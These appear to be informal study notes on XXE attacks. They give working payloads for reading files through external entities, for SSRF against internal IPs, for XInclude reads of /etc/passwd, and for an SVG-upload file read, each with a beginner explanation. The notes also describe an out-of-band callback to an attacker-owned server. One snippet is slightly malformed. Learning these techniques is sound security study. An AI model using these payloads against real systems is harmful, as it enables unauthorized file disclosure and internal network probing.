- here we are using vuln to retrieve files:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{file}"> ]>
```
- here the variable name is xxe we should u se &xxe; to use it.


- here we are performing an ssrf  attack we can use sam payload as above
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{ip}"> ]>
```

a slight change would be that we are giving the ip of server we want to perform ssrf

so here we might get output as the directory of the server if we following the directory we can find what we want.

there is another senario which we might use this for:
if there is an out of bound xxe we don't get any error messages in that case we can use this payload and give ip of the server we the hacker own and could make a request to see if there is a vuln. if there is a vuln we can see the request made by the web app in our server.


- exploiting x-include to retrive files:
in this scenario we cant use classic xxe exploitation, because tge data is send to server side and the one who took care of xml is server side programming language, 

Let's break it down step by step and explain its components:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- `<foo>`: This is like the main container for your document.

- `xmlns:xi="http://www.w3.org/2001/XInclude"`: It's like saying, "I want to use a special tool called 'xi' that can help me include stuff from other places."

- `<xi:include>`: This is where you tell that special tool what you want to include.

- `parse="text"`: You're telling the tool that the stuff you want to include is just plain text, like regular words.

- `href="file:///etc/passwd"`: Here's where things get tricky. You're telling the tool to go and get some text from a specific file on your computer, which is usually off-limits for security reasons. The file you're trying to access, "/etc/passwd," contains information about user accounts on the computer.

- `/>`: This is supposed to close the "include" instruction

In simple terms, this code is trying to grab information from a sensitive file on a system.



- suppose we can upload images somewhere, this code helps to retrive informations from targets using xml in an svg image format. here in this case we used to retrive host name we can do the same with etc/passwd file etc.
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]> <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16"x="0" y="16">&xxe;</text></svg>
```
 Let me break this down :

1. The code starts with an XML declaration, specifying the version of XML being used.

2. Inside the `<!DOCTYPE>` declaration, it defines an entity called `xxe`. An entity is like a placeholder for a piece of data.

3. This `xxe` entity is defined to pull data from a file located at "file:///etc/hostname". In simpler terms, it's trying to read the content of a file called "hostname" from the root directory of the system.

4. The code then creates an SVG image with some text. The interesting part is that it includes the `&xxe;` entity inside the text element. This means that the content of the "hostname" file will be inserted into the SVG image where `&xxe;` is placed.

5. If the server or system processing this XML document does not properly secure against XXE attacks, it will attempt to read the specified file ("hostname" in this case) and display its content in the SVG image.

This code is a security vulnerability because it could potentially be used to read sensitive system files, leading to unauthorized access or exposure of sensitive information. To protect against such attacks, systems should disable external entity expansion or properly sanitize and validate incoming XML data.

